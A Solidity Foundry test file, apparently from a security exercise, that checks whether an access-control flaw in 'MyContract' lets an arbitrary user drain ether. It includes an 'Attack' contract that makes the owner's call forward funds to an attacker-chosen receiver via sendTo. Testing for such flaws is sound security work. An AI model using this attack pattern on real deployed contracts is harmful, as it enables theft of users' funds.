
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract TestAccessControlMyContract is Test {
    MyContract public _contractUnderTest;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        _contractUnderTest = new MyContract();
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint256 amount) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != owner);
        vm.assume(receiver != address(0));
        vm.assume(receiver.code.length == 0);
        vm.assume(amount > 0);

        vm.deal(address(_contractUnderTest), amount);
        vm.deal(caller, 1 ether);

        vm.prank(caller);
        Attack attack = new Attack(_contractUnderTest);

        uint balanceBefore = receiver.balance;
        vm.prank(owner);
        attack.attack(receiver, amount);
        uint balanceAfter = receiver.balance;
        assertEq(balanceAfter, balanceBefore + amount);
    }
}

contract Attack {
    MyContract target;

    constructor(MyContract _target) {
        target = _target;
    }

    function attack(address payable receiver, uint amount) external {
        target.sendTo(receiver, amount);
    }
}
